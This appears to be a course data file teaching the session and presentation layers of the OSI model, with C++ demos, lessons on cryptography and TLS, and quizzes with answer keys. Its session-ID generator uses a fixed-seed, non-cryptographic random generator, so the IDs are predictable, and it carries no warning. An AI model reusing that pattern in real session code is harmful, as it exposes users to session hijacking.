          code: `// === Session Layer Concepts in C++ ===
// Demonstrates session management patterns

#include <iostream>
#include <string>
#include <unordered_map>
#include <random>
#include <chrono>
using namespace std;

// Simple session store (like server-side session management)
class SessionStore {
    struct Session {
        string userId;
        string data;
        time_t createdAt;
        time_t lastAccess;
        int timeout; // seconds
    };
    unordered_map<string, Session> sessions;

    string generateId() {
        static mt19937 rng(42);
        uniform_int_distribution<> dist(0, 15);
        string id;
        const char hex[] = "0123456789abcdef";
        for (int i = 0; i < 32; i++) id += hex[dist(rng)];
        return id;
    }
public:
    string createSession(const string& userId, int timeoutSec = 1800) {
        string sid = generateId();
        time_t now = time(nullptr);
        sessions[sid] = {userId, "", now, now, timeoutSec};
        cout << "Session created: " << sid.substr(0, 8)
             << "... for user " << userId << endl;
        return sid;
    }

    bool validateSession(const string& sid) {
        auto it = sessions.find(sid);
        if (it == sessions.end()) return false;
        time_t now = time(nullptr);
        if (now - it->second.lastAccess > it->second.timeout) {
            cout << "Session expired: " << sid.substr(0, 8) << "..." << endl;
            sessions.erase(it);
            return false;
        }
        it->second.lastAccess = now;
        return true;
    }

    void destroySession(const string& sid) {
        sessions.erase(sid);
        cout << "Session destroyed: " << sid.substr(0, 8) << "..." << endl;
    }

    size_t activeSessions() const { return sessions.size(); }
};

// RPC stub simulation
class RPCStub {
public:
    // Marshal: serialize function call into bytes
    static string marshal(const string& funcName, const string& params) {
        return funcName + "|" + params; // simplified serialization
    }

    // Unmarshal: deserialize bytes into function call
    static pair<string, string> unmarshal(const string& data) {
        size_t pos = data.find('|');
        return {data.substr(0, pos), data.substr(pos + 1)};
    }

    // Simulate RPC call
    static string call(const string& funcName, const string& params) {
        string request = marshal(funcName, params);
        cout << "RPC Request: " << request << endl;

        // "Network transfer" (simulated)
        auto [func, args] = unmarshal(request);
        cout << "Server executing: " << func << "(" << args << ")" << endl;

        // Server processes and returns result
        string result = "result_of_" + func;
        cout << "RPC Response: " << result << endl;
        return result;
    }
};

// Dialog control modes
enum class DialogMode { SIMPLEX, HALF_DUPLEX, FULL_DUPLEX };

string dialogModeStr(DialogMode m) {
    switch (m) {
        case DialogMode::SIMPLEX: return "Simplex (one-way)";
        case DialogMode::HALF_DUPLEX: return "Half-Duplex (alternating)";
        case DialogMode::FULL_DUPLEX: return "Full-Duplex (simultaneous)";
    }
    return "Unknown";
}

int main() {
    cout << "=== Session Management ===" << endl;
    SessionStore store;
    string sid1 = store.createSession("alice");
    string sid2 = store.createSession("bob");
    cout << "Active sessions: " << store.activeSessions() << endl;
    cout << "Validate sid1: " << (store.validateSession(sid1) ? "valid" : "invalid") << endl;
    store.destroySession(sid2);
    cout << "Active after logout: " << store.activeSessions() << endl;

    cout << "\n=== RPC Simulation ===" << endl;
    RPCStub::call("getPrice", "AAPL");
    RPCStub::call("placeOrder", "BUY,AAPL,100");

    cout << "\n=== Dialog Control Modes ===" << endl;
    cout << dialogModeStr(DialogMode::SIMPLEX) << " - e.g., TV broadcast" << endl;
    cout << dialogModeStr(DialogMode::HALF_DUPLEX) << " - e.g., HTTP/1.0" << endl;
    cout << dialogModeStr(DialogMode::FULL_DUPLEX) << " - e.g., WebSocket" << endl;

    return 0;
}`,
          problems: [
            ['Session Management Basics','https://www.geeksforgeeks.org/session-layer-in-osi-model/','Easy'],
            ['Remote Procedure Call (RPC)','https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/','Medium'],
            ['Session Hijacking & Prevention','https://www.geeksforgeeks.org/session-hijacking/','Medium'],
            ['gRPC & Protocol Buffers','https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/','Medium'],
          ],
          mcqs: [
            {q: 'The Session Layer is responsible for:', o: ['Routing packets', 'Dialog control and session management', 'Error detection', 'Encryption'], a: 1},
            {q: 'Which dialog mode allows simultaneous two-way communication?', o: ['Simplex', 'Half-duplex', 'Full-duplex', 'Broadcast'], a: 2},
            {q: 'In RPC, the client stub is responsible for:', o: ['Executing the remote function', 'Marshalling parameters and sending the request', 'Managing the TCP connection', 'Encrypting the data'], a: 1},
            {q: 'gRPC uses which serialization format by default?', o: ['JSON', 'XML', 'Protocol Buffers', 'MessagePack'], a: 2},
            {q: 'Synchronization points in the Session Layer are used to:', o: ['Encrypt data', 'Resume transmission from the last checkpoint after failure', 'Compress data', 'Assign IP addresses'], a: 1},
            {q: 'Cookie-based sessions vs JWT — which is stateful?', o: ['JWT', 'Cookie-based sessions', 'Both are stateless', 'Both are stateful'], a: 1},
            {q: 'SIP (Session Initiation Protocol) is primarily used for:', o: ['File transfer', 'Establishing multimedia sessions (VoIP)', 'Email delivery', 'DNS resolution'], a: 1},
            {q: 'NetBIOS operates at which OSI layer?', o: ['Network', 'Transport', 'Session', 'Application'], a: 2}
          ],
        }
      ]
    },
    // ==================== TAB 6: Presentation Layer (OSI Layer 6) ====================
    {
      id: 'presentation', t: 'Presentation Layer',
      topics: [
        {
          t: 'Presentation Layer — Encryption, Encoding & Compression',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">The <b>Presentation Layer (Layer 6)</b> is responsible for data translation, encryption, and compression — ensuring that data sent by one application can be understood by another, regardless of differences in encoding or architecture. For SDE placements, this layer\'s cryptography concepts are <b>heavily tested</b>: symmetric vs asymmetric encryption, hashing algorithms, digital signatures, and the TLS handshake. Secure communication is critical for trading systems — understanding how TLS protects data in transit and how certificates work is a practical daily requirement.</p></div><div class="learn-section"><div class="learn-h">Presentation Layer Functions</div><ul class="learn-list"><li><b>Data Translation / Encoding:</b> Converting data between different formats — ASCII, Unicode (UTF-8/16), EBCDIC. Ensures a Windows machine and a Unix server can exchange text correctly.</li><li><b>Data Encryption / Decryption:</b> Applying cryptographic algorithms to protect data confidentiality. TLS/SSL encryption operates conceptually at this layer.</li><li><b>Data Compression:</b> Reducing data size for efficient transmission. Lossy (JPEG, MP3) for multimedia; lossless (gzip, Huffman, LZ77) for text/binary.</li><li><b>Serialization / Deserialization:</b> Converting structured data (objects, records) into a byte stream for transmission and back. JSON, XML, Protocol Buffers, MessagePack.</li></ul></div><div class="learn-section"><div class="learn-h">Character Encoding</div><table class="learn-table"><tr><th>Encoding</th><th>Bits</th><th>Characters</th><th>Notes</th></tr><tr><td>ASCII</td><td>7 bits</td><td>128</td><td>English letters, digits, symbols only</td></tr><tr><td>Extended ASCII</td><td>8 bits</td><td>256</td><td>Adds accented characters (Latin-1)</td></tr><tr><td>Unicode (UTF-8)</td><td>1-4 bytes</td><td>1.1M+</td><td>Variable-length, backward compatible with ASCII. The web standard.</td></tr><tr><td>Unicode (UTF-16)</td><td>2-4 bytes</td><td>1.1M+</td><td>Used internally by Java, Windows</td></tr><tr><td>Unicode (UTF-32)</td><td>4 bytes</td><td>1.1M+</td><td>Fixed-width, wasteful for ASCII text</td></tr><tr><td>EBCDIC</td><td>8 bits</td><td>256</td><td>IBM mainframes (legacy)</td></tr></table><p class="learn-p"><b>MIME Types:</b> Used in HTTP and email to specify the format of data being transmitted. Examples: <code>text/html</code>, <code>application/json</code>, <code>image/png</code>, <code>application/octet-stream</code>. The Content-Type header tells the receiver how to interpret the data.</p></div><div class="learn-section"><div class="learn-h">Cryptography — Symmetric Encryption</div><p class="learn-p"><b>Symmetric encryption</b> uses the <b>same key</b> for both encryption and decryption. It is fast and used for bulk data encryption.</p><div class="learn-code">Plaintext + Key → [Encryption Algorithm] → Ciphertext\nCiphertext + Key → [Decryption Algorithm] → Plaintext\n\nKey challenge: How do sender and receiver securely share the key?\nThis is the KEY DISTRIBUTION PROBLEM.</div><table class="learn-table"><tr><th>Algorithm</th><th>Key Size</th><th>Block Size</th><th>Status</th></tr><tr><td>DES</td><td>56 bits</td><td>64 bits</td><td>Broken (brute-forceable). Do not use.</td></tr><tr><td>3DES (Triple DES)</td><td>112/168 bits</td><td>64 bits</td><td>Legacy. Slow (3x DES operations).</td></tr><tr><td>AES</td><td>128/192/256 bits</td><td>128 bits</td><td><b>Current standard.</b> Fast, secure.</td></tr><tr><td>ChaCha20</td><td>256 bits</td><td>Stream cipher</td><td>Modern. Used in TLS 1.3 (mobile/IoT).</td></tr><tr><td>RC4</td><td>40-2048 bits</td><td>Stream cipher</td><td>Broken. Removed from TLS.</td></tr></table><p class="learn-p"><b>Block Cipher Modes:</b></p><ul class="learn-list"><li><b>ECB (Electronic Codebook):</b> Each block encrypted independently. <b>Insecure</b> — identical plaintext blocks produce identical ciphertext blocks (reveals patterns).</li><li><b>CBC (Cipher Block Chaining):</b> Each block XORed with previous ciphertext block before encryption. Requires an IV (Initialization Vector). Sequential — cannot parallelize encryption.</li><li><b>CTR (Counter Mode):</b> Converts block cipher to stream cipher using a counter. <b>Parallelizable</b> for both encryption and decryption.</li><li><b>GCM (Galois/Counter Mode):</b> CTR + authentication tag. Provides <b>authenticated encryption</b> (confidentiality + integrity). <b>Used in TLS 1.3</b>.</li></ul><div class="learn-warn"><b>Never use ECB mode.</b> The famous ECB penguin demonstrates the problem: encrypting an image with ECB preserves the outline of the original image because identical pixel blocks produce identical ciphertext blocks.</div></div><div class="learn-section"><div class="learn-h">Cryptography — Asymmetric Encryption</div><p class="learn-p"><b>Asymmetric (public-key) encryption</b> uses a <b>key pair</b>: a public key (shared freely) and a private key (kept secret). Data encrypted with the public key can only be decrypted with the private key, and vice versa.</p><div class="learn-code">Encryption: Plaintext + Public Key → Ciphertext\nDecryption: Ciphertext + Private Key → Plaintext\n\nAlternatively (for digital signatures):\nSign:   Message + Private Key → Signature\nVerify: Signature + Public Key → Valid/Invalid</div><table class="learn-table"><tr><th>Algorithm</th><th>Key Size</th><th>Based On</th><th>Use Case</th></tr><tr><td>RSA</td><td>2048-4096 bits</td><td>Integer factorization</td><td>Encryption, digital signatures</td></tr><tr><td>ECC (Elliptic Curve)</td><td>256-384 bits</td><td>Elliptic curve discrete log</td><td>Faster, smaller keys. Used in TLS 1.3</td></tr><tr><td>Diffie-Hellman (DH)</td><td>2048+ bits</td><td>Discrete logarithm</td><td>Key exchange only (not encryption)</td></tr><tr><td>ECDHE</td><td>256 bits</td><td>Elliptic curve DH</td><td>Key exchange in TLS with forward secrecy</td></tr></table><p class="learn-p"><b>Symmetric vs Asymmetric:</b></p><table class="learn-table"><tr><th>Aspect</th><th>Symmetric</th><th>Asymmetric</th></tr><tr><td>Speed</td><td><b>Fast</b> (100-1000x faster)</td><td>Slow</td></tr><tr><td>Key Distribution</td><td>Hard (shared secret)</td><td><b>Easy</b> (public key is public)</td></tr><tr><td>Key Count (n parties)</td><td>n(n-1)/2 keys</td><td>2n keys (1 pair per party)</td></tr><tr><td>Use Case</td><td>Bulk data encryption</td><td>Key exchange, digital signatures</td></tr></table><div class="learn-tip"><b>Key insight:</b> In practice, <b>both are used together</b> (hybrid encryption). Asymmetric encryption exchanges a symmetric session key. Then symmetric encryption encrypts the actual data. This is exactly what TLS does.</div></div><div class="learn-section"><div class="learn-h">Hashing Algorithms</div><p class="learn-p">A <b>hash function</b> maps arbitrary-length input to a fixed-length output (digest). It is a one-way function — you cannot reverse a hash to get the original input.</p><div class="learn-code">Properties of a cryptographic hash:\n1. Deterministic: same input always gives same output\n2. Fast to compute\n3. Pre-image resistance: given H(x), cannot find x\n4. Collision resistance: hard to find x != y where H(x) = H(y)\n5. Avalanche effect: 1-bit input change → ~50% output bits change</div><table class="learn-table"><tr><th>Algorithm</th><th>Output Size</th><th>Status</th></tr><tr><td>MD5</td><td>128 bits</td><td><b>Broken.</b> Collisions found. Do not use for security.</td></tr><tr><td>SHA-1</td><td>160 bits</td><td><b>Broken.</b> Google demonstrated collision (SHAttered). Deprecated.</td></tr><tr><td>SHA-256</td><td>256 bits</td><td><b>Current standard.</b> Used in Bitcoin, TLS, Git.</td></tr><tr><td>SHA-3</td><td>224-512 bits</td><td>Latest standard (different internal structure: Keccak sponge).</td></tr><tr><td>bcrypt/scrypt/Argon2</td><td>Variable</td><td>Password hashing (intentionally slow + salted).</td></tr></table><p class="learn-p"><b>Use cases:</b> Password storage (hash + salt), data integrity verification, digital signatures (hash then sign), blockchain proof of work, Git commit IDs.</p></div><div class="learn-section"><div class="learn-h">Digital Signatures &amp; Certificates</div><p class="learn-p">A <b>digital signature</b> provides authentication, integrity, and non-repudiation:</p><div class="learn-code">Signing:\n  1. Hash the message: digest = SHA-256(message)\n  2. Encrypt digest with sender\'s private key: signature = Encrypt(digest, priv_key)\n  3. Send: message + signature\n\nVerification:\n  1. Hash the received message: digest1 = SHA-256(message)\n  2. Decrypt signature with sender\'s public key: digest2 = Decrypt(signature, pub_key)\n  3. If digest1 == digest2: signature is valid\n     (message is authentic, unmodified, and non-repudiable)</div><p class="learn-p"><b>Digital Certificates (X.509):</b> Bind a public key to an identity. Issued by a <b>Certificate Authority (CA)</b>. The CA signs the certificate with its private key. Browsers trust certificates signed by known CAs (root certificates pre-installed in OS/browser).</p><div class="learn-code">Certificate Chain of Trust:\n\nRoot CA (self-signed, pre-installed in browser)\n  └─ signs → Intermediate CA certificate\n                 └─ signs → Server certificate (e.g., google.com)\n\nBrowser verifies: server cert → intermediate CA → root CA (trusted)</div></div><div class="learn-section"><div class="learn-h">TLS Handshake (Presentation + Session)</div><p class="learn-p">The <b>TLS handshake</b> combines session establishment with presentation-layer encryption. TLS 1.3 (current standard) simplified the handshake to <b>1-RTT</b> (vs 2-RTT in TLS 1.2):</p><div class="learn-code">TLS 1.3 Handshake (1-RTT):\n\nClient                                    Server\n  │                                          │\n  │── ClientHello ────────────────────▶│\n  │   (supported ciphers, key share,          │\n  │    client random, SNI)                    │\n  │                                          │\n  │◀── ServerHello + Certificate + Verify ──│\n  │   (chosen cipher, key share,              │\n  │    server cert, signature)                │\n  │                                          │\n  │   [Both derive session keys using ECDHE]  │\n  │                                          │\n  │── Finished (encrypted) ────────────▶│\n  │                                          │\n  │◀────── Application Data (encrypted) ────│\n\nKey exchange: ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)\nBulk encryption: AES-256-GCM or ChaCha20-Poly1305\nForward secrecy: New key pair per session (ephemeral keys)</div><p class="learn-p"><b>Forward Secrecy:</b> Even if the server\'s long-term private key is compromised, past sessions cannot be decrypted because each session used a unique ephemeral key pair. ECDHE provides this; static RSA key exchange does not (removed in TLS 1.3).</p></div><div class="learn-section"><div class="learn-h">Data Compression</div><table class="learn-table"><tr><th>Type</th><th>Algorithm</th><th>Ratio</th><th>Use Case</th></tr><tr><td>Lossless</td><td>Huffman Coding</td><td>~50%</td><td>Text, general-purpose</td></tr><tr><td>Lossless</td><td>LZ77 / LZ78</td><td>~60-70%</td><td>gzip, zlib, PNG</td></tr><tr><td>Lossless</td><td>Deflate (LZ77 + Huffman)</td><td>~65%</td><td>gzip, zip, HTTP compression</td></tr><tr><td>Lossy</td><td>JPEG (DCT)</td><td>~90%</td><td>Images</td></tr><tr><td>Lossy</td><td>MP3 / AAC</td><td>~90%</td><td>Audio</td></tr><tr><td>Lossy</td><td>H.264 / H.265</td><td>~95%</td><td>Video</td></tr></table><p class="learn-p"><b>HTTP Compression:</b> The browser sends <code>Accept-Encoding: gzip, br</code>. The server compresses the response body and sends <code>Content-Encoding: gzip</code>. This typically reduces HTML/CSS/JS by 60-80%.</p></div><div class="learn-section"><div class="learn-h">Serialization Formats</div><table class="learn-table"><tr><th>Format</th><th>Type</th><th>Size</th><th>Speed</th><th>Use Case</th></tr><tr><td>JSON</td><td>Text</td><td>Large</td><td>Moderate</td><td>REST APIs, web (human-readable)</td></tr><tr><td>XML</td><td>Text</td><td>Very large</td><td>Slow</td><td>SOAP, legacy enterprise</td></tr><tr><td>Protocol Buffers</td><td>Binary</td><td><b>Small</b></td><td><b>Fast</b></td><td>gRPC, internal services</td></tr><tr><td>MessagePack</td><td>Binary</td><td>Small</td><td>Fast</td><td>Redis, IoT</td></tr><tr><td>Avro</td><td>Binary</td><td>Small</td><td>Fast</td><td>Hadoop, Kafka</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Compare symmetric and asymmetric encryption.</b><br>A: Symmetric uses one shared key (AES, ChaCha20) — fast but key distribution is hard. Asymmetric uses a key pair (RSA, ECC) — slow but solves key distribution. In practice, TLS uses asymmetric to exchange a symmetric session key, then symmetric for bulk encryption. For n parties: symmetric needs n(n-1)/2 keys; asymmetric needs 2n.</p><p class="learn-p"><b>Q2: Why is ECB mode insecure?</b><br>A: ECB encrypts each block independently with the same key. Identical plaintext blocks produce identical ciphertext blocks, revealing patterns in the data. The ECB penguin example shows an image encrypted with ECB retains the original outline. Use CBC, CTR, or GCM instead.</p><p class="learn-p"><b>Q3: Explain the TLS 1.3 handshake.</b><br>A: 1-RTT handshake: Client sends ClientHello (supported ciphers + ECDHE key share). Server responds with ServerHello (chosen cipher + key share + certificate + signature). Both derive the session key using ECDHE. Subsequent data is encrypted with AES-GCM or ChaCha20. Forward secrecy is guaranteed by ephemeral keys.</p><p class="learn-p"><b>Q4: What is forward secrecy and why does it matter?</b><br>A: Forward secrecy ensures that compromising the server\'s long-term private key doesn\'t compromise past sessions. Achieved using ephemeral key exchange (ECDHE) — each session generates new key pairs that are discarded after use. Without forward secrecy (static RSA), an attacker who obtains the private key can decrypt all recorded traffic.</p><p class="learn-p"><b>Q5: How does a digital signature work?</b><br>A: The sender hashes the message (SHA-256), then encrypts the hash with their private key — this is the signature. The receiver decrypts the signature with the sender\'s public key to get the hash, then independently hashes the message and compares. If they match: the message is authentic (came from the sender), has integrity (wasn\'t modified), and is non-repudiable (sender can\'t deny signing it).</p><p class="learn-p"><b>Q6: Why is MD5 considered broken?</b><br>A: Researchers demonstrated practical collision attacks — two different inputs producing the same MD5 hash. This breaks integrity verification and certificate security. SHA-1 is also broken (Google\'s SHAttered attack). Use SHA-256 or SHA-3 for security-critical applications.</p></div>',
          code: `// === Presentation Layer — Cryptography Concepts in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <numeric>
#include <sstream>
#include <iomanip>
using namespace std;

// --- Simple Caesar Cipher (symmetric, substitution) ---
string caesarEncrypt(const string& text, int shift) {
    string result = text;
    for (char& c : result) {
        if (isalpha(c)) {
            char base = isupper(c) ? 'A' : 'a';
            c = base + (c - base + shift) % 26;
        }
    }
    return result;
}

string caesarDecrypt(const string& text, int shift) {
    return caesarEncrypt(text, 26 - shift);
}

// --- XOR Cipher (symmetric, stream cipher concept) ---
string xorCipher(const string& text, const string& key) {
    string result = text;
    for (size_t i = 0; i < text.size(); i++)
        result[i] = text[i] ^ key[i % key.size()];
    return result;
}

// --- Simple Hash Function (DJB2 — for demonstration) ---
uint32_t djb2Hash(const string& str) {
    uint32_t hash = 5381;
    for (char c : str)
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    return hash;
}

// --- RSA-like math (simplified with small numbers) ---
long long modPow(long long base, long long exp, long long mod) {
    long long result = 1;
    base %= mod;
    while (exp > 0) {
        if (exp & 1) result = result * base % mod;
        base = base * base % mod;
        exp >>= 1;
    }
    return result;
}

void demoRSA() {
    // Small example (NOT secure — use large primes in practice)
    long long p = 61, q = 53;
    long long n = p * q;           // 3233 (modulus)
    long long phi = (p-1)*(q-1);   // 3120
    long long e = 17;              // public exponent (coprime to phi)
    // d = modular inverse of e mod phi
    // d * e ≡ 1 (mod 3120), d = 2753
    long long d = 2753;

    long long message = 42;
    long long encrypted = modPow(message, e, n);
    long long decrypted = modPow(encrypted, d, n);

    cout << "RSA Demo (p=" << p << ", q=" << q << "):" << endl;
    cout << "  Public key:  (e=" << e << ", n=" << n << ")" << endl;
    cout << "  Private key: (d=" << d << ", n=" << n << ")" << endl;
    cout << "  Message:     " << message << endl;
    cout << "  Encrypted:   " << encrypted << endl;
    cout << "  Decrypted:   " << decrypted << endl;
}

// --- Digital Signature (simplified) ---
void demoDigitalSignature() {
    string message = "Transfer $1000 to Alice";
    uint32_t hash = djb2Hash(message);
    cout << "\nDigital Signature Demo:" << endl;
    cout << "  Message: " << message << endl;
    cout << "  Hash:    " << hex << hash << dec << endl;
    cout << "  Sign:    Encrypt(hash, private_key) -> signature" << endl;
    cout << "  Verify:  Decrypt(signature, public_key) == hash?" << endl;

    // Tampered message
    string tampered = "Transfer $9000 to Alice";
    uint32_t tamperedHash = djb2Hash(tampered);
    cout << "  Tampered hash: " << hex << tamperedHash << dec << endl;
    cout << "  Hashes match? " << (hash == tamperedHash ? "YES (bad!)" : "NO (tamper detected!)") << endl;
}

int main() {
    // Caesar cipher
    cout << "=== Caesar Cipher (Symmetric) ===" << endl;
    string plaintext = "HELLO WORLD";
    int shift = 3;
    string encrypted = caesarEncrypt(plaintext, shift);
    string decrypted = caesarDecrypt(encrypted, shift);
    cout << "  Plaintext:  " << plaintext << endl;
    cout << "  Encrypted:  " << encrypted << endl;
    cout << "  Decrypted:  " << decrypted << endl;

    // XOR cipher
    cout << "\n=== XOR Cipher (Symmetric Stream) ===" << endl;
    string msg = "SECRET";
    string key = "KEY";
    string xorEnc = xorCipher(msg, key);
    string xorDec = xorCipher(xorEnc, key); // XOR is its own inverse
    cout << "  Message:   " << msg << endl;
    cout << "  Key:       " << key << endl;
    cout << "  Decrypted: " << xorDec << endl;

    // Hashing
    cout << "\n=== Hashing ===" << endl;
    cout << "  Hash('hello'):   " << hex << djb2Hash("hello") << dec << endl;
    cout << "  Hash('hello1'):  " << hex << djb2Hash("hello1") << dec << endl;
    cout << "  Hash('hello'):   " << hex << djb2Hash("hello") << dec << " (deterministic)" << endl;

    // RSA
    cout << "\n=== RSA (Asymmetric) ===" << endl;
    demoRSA();

    // Digital signature
    demoDigitalSignature();

    // Key count comparison
    cout << "\n=== Key Count: n parties ===" << endl;
    for (int n : {2, 5, 10, 100}) {
        cout << "  n=" << n << ": Symmetric=" << n*(n-1)/2
             << " keys, Asymmetric=" << 2*n << " keys" << endl;
    }

    return 0;
}`,
          problems: [
            ['Caesar Cipher Implementation','https://www.geeksforgeeks.org/caesar-cipher-in-cryptography/','Easy'],
            ['RSA Algorithm','https://www.geeksforgeeks.org/rsa-algorithm-cryptography/','Medium'],
            ['Diffie-Hellman Key Exchange','https://www.geeksforgeeks.org/implementation-diffie-hellman-algorithm/','Medium'],
            ['AES Encryption Modes','https://www.geeksforgeeks.org/advanced-encryption-standard-aes/','Medium'],
            ['TLS 1.3 Handshake','https://www.geeksforgeeks.org/transport-layer-security-tls/','Medium'],
            ['Digital Signatures','https://www.geeksforgeeks.org/digital-signatures-certificates/','Easy'],
          ],
          mcqs: [
            {q: 'AES is a:', o: ['Asymmetric encryption algorithm', 'Symmetric encryption algorithm', 'Hashing algorithm', 'Key exchange protocol'], a: 1},
            {q: 'In TLS 1.3, the key exchange uses:', o: ['Static RSA', 'ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)', 'DES', 'MD5'], a: 1},
            {q: 'ECB mode is insecure because:', o: ['It uses a weak key', 'Identical plaintext blocks produce identical ciphertext blocks', 'It does not use an IV', 'Both B and C'], a: 3},
            {q: 'SHA-256 produces a hash of size:', o: ['128 bits', '160 bits', '256 bits', '512 bits'], a: 2},
            {q: 'For 10 parties to communicate securely, symmetric encryption requires how many keys?', o: ['10', '20', '45', '100'], a: 2},
            {q: 'Forward secrecy ensures that:', o: ['Messages are encrypted faster', 'Compromising the server key cannot decrypt past sessions', 'The server certificate never expires', 'All ciphers use AES'], a: 1},
            {q: 'Which hash algorithm is considered broken and should not be used?', o: ['SHA-256', 'SHA-3', 'MD5', 'bcrypt'], a: 2},
            {q: 'A digital signature provides:', o: ['Confidentiality only', 'Authentication, integrity, and non-repudiation', 'Compression', 'Routing'], a: 1},
            {q: 'UTF-8 encoding is backward compatible with:', o: ['EBCDIC', 'UTF-16', 'ASCII', 'Latin-1'], a: 2}
          ],
        },
        {
          t: 'Cryptography Deep Dive — DH, RSA, AES & TLS',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Cryptography is at the heart of every secure system. In SDE placement interviews, you are expected to go beyond surface-level definitions and understand <b>how</b> algorithms like Diffie-Hellman, RSA, and AES actually work — including the math. In financial systems, secure communication protects trading strategies and client data; understanding TLS internals, certificate chains, and common crypto pitfalls is a practical requirement. This topic gives you the depth needed to confidently answer questions about key exchange, encryption, and PKI.</p></div><div class="learn-section"><div class="learn-h">Diffie-Hellman Key Exchange</div><p class="learn-p">The <b>Diffie-Hellman (DH) protocol</b> allows two parties to establish a shared secret over an insecure channel without prior shared knowledge. It was published in 1976 by Whitfield Diffie and Martin Hellman.</p><p class="learn-p"><b>Mathematical Basis:</b> DH relies on the <b>discrete logarithm problem</b> — given g, p, and g^a mod p, it is computationally infeasible to find a (for large primes).</p><div class="learn-code">Diffie-Hellman Key Exchange — Step by Step:\n\n1. Alice and Bob publicly agree on:\n   - A large prime p (e.g., p = 23)\n   - A generator g (e.g., g = 5)\n\n2. Alice picks a secret integer a (e.g., a = 6)\n   Computes A = g^a mod p = 5^6 mod 23 = 15625 mod 23 = 8\n   Sends A = 8 to Bob\n\n3. Bob picks a secret integer b (e.g., b = 15)\n   Computes B = g^b mod p = 5^15 mod 23 = 19\n   Sends B = 19 to Alice\n\n4. Alice computes shared secret: s = B^a mod p = 19^6 mod 23 = 2\n   Bob computes shared secret:   s = A^b mod p = 8^15 mod 23 = 2\n\nBoth get s = 2! This is the shared secret key.\nAn eavesdropper knows g=5, p=23, A=8, B=19 but cannot find s\nwithout solving the discrete log problem.</div><p class="learn-p"><b>Security:</b> The security of DH depends on the <b>discrete logarithm problem (DLP)</b>. Given g^a mod p, finding a requires trying an exponential number of possibilities for large primes (2048+ bits in practice).</p><div class="learn-warn"><b>MITM Vulnerability:</b> Basic DH is vulnerable to a man-in-the-middle attack. An attacker (Mallory) can intercept and replace A and B with her own values, establishing separate shared secrets with Alice and Bob. <b>Solution:</b> Authenticate the exchange using digital signatures or certificates (as done in TLS).</div></div><div class="learn-section"><div class="learn-h">RSA Algorithm</div><p class="learn-p"><b>RSA</b> (Rivest-Shamir-Adleman, 1977) is the most widely known asymmetric encryption algorithm. Its security relies on the difficulty of <b>factoring large integers</b>.</p><p class="learn-p"><b>Key Generation:</b></p><div class="learn-code">RSA Key Generation:\n\n1. Choose two large primes: p = 61, q = 53\n2. Compute n = p * q = 61 * 53 = 3233\n3. Compute phi(n) = (p-1)(q-1) = 60 * 52 = 3120\n4. Choose e such that 1 &lt; e &lt; phi(n) and gcd(e, phi(n)) = 1\n   e = 17 (common choices: 3, 17, 65537)\n5. Compute d = e^(-1) mod phi(n)  [modular inverse]\n   d = 2753  (because 17 * 2753 = 46801 = 15 * 3120 + 1)\n   Verify: 17 * 2753 mod 3120 = 1 ✓\n\nPublic key:  (e, n) = (17, 3233)\nPrivate key: (d, n) = (2753, 3233)</div><p class="learn-p"><b>Encryption &amp; Decryption:</b></p><div class="learn-code">Encryption (with public key):\n  Plaintext M = 65\n  Ciphertext C = M^e mod n = 65^17 mod 3233 = 2790\n\nDecryption (with private key):\n  Plaintext M = C^d mod n = 2790^2753 mod 3233 = 65 ✓\n\nWhy it works (Euler\'s theorem):\n  M^(e*d) mod n = M^(1 + k*phi(n)) mod n = M * (M^phi(n))^k mod n\n  By Euler\'s theorem: M^phi(n) mod n = 1 (when gcd(M,n) = 1)\n  Therefore: M^(e*d) mod n = M * 1^k mod n = M</div><p class="learn-p"><b>Key Sizes:</b> RSA-2048 (minimum recommended), RSA-3072 (128-bit security equivalent), RSA-4096 (high security). The security comes from the difficulty of factoring n back into p and q.</p><div class="learn-tip"><b>Tip:</b> e = 65537 (2^16 + 1) is the most commonly used public exponent because it has only two bits set in binary (10000000000000001), making modular exponentiation fast. Small values like e = 3 are vulnerable to certain attacks.</div></div><div class="learn-section"><div class="learn-h">AES Internals</div><p class="learn-p"><b>AES (Advanced Encryption Standard)</b> is a symmetric block cipher that processes data in 128-bit blocks. It was standardized by NIST in 2001, replacing DES. AES operates on a 4x4 byte matrix called the <b>state</b>.</p><p class="learn-p"><b>Number of Rounds:</b></p><table class="learn-table"><tr><th>Key Size</th><th>Rounds</th><th>Name</th></tr><tr><td>128 bits</td><td>10</td><td>AES-128</td></tr><tr><td>192 bits</td><td>12</td><td>AES-192</td></tr><tr><td>256 bits</td><td>14</td><td>AES-256</td></tr></table><p class="learn-p"><b>Each round consists of 4 operations:</b></p><ul class="learn-list"><li><b>SubBytes:</b> Each byte is substituted using a fixed lookup table (S-box). Provides <b>confusion</b> (non-linear relationship between key and ciphertext).</li><li><b>ShiftRows:</b> Rows of the state matrix are cyclically shifted left. Row 0: no shift. Row 1: shift 1. Row 2: shift 2. Row 3: shift 3. Provides <b>diffusion</b> across columns.</li><li><b>MixColumns:</b> Each column is multiplied by a fixed polynomial matrix in GF(2^8). Provides <b>diffusion</b> — each output byte depends on all 4 input bytes of the column. <b>Skipped in the final round.</b></li><li><b>AddRoundKey:</b> State is XORed with the round key (derived from the main key via key schedule). This is where the key material enters.</li></ul><div class="learn-code">AES Round Structure (for AES-128, 10 rounds):\n\nPlaintext (128 bits = 16 bytes)\n  |\n  v\nAddRoundKey (Round 0 — initial key addition)\n  |\n  v\nRound 1-9: SubBytes → ShiftRows → MixColumns → AddRoundKey\n  |\n  v\nRound 10 (final): SubBytes → ShiftRows → AddRoundKey\n  (no MixColumns in final round)\n  |\n  v\nCiphertext (128 bits)</div></div><div class="learn-section"><div class="learn-h">AES Block Cipher Modes</div><table class="learn-table"><tr><th>Mode</th><th>Description</th><th>Parallel?</th><th>IV?</th><th>Security</th></tr><tr><td>ECB</td><td>Each block encrypted independently</td><td>Yes</td><td>No</td><td><b>Insecure</b> — identical blocks produce identical ciphertext</td></tr><tr><td>CBC</td><td>Each block XORed with previous ciphertext</td><td>Decrypt only</td><td>Yes</td><td>Secure but sequential 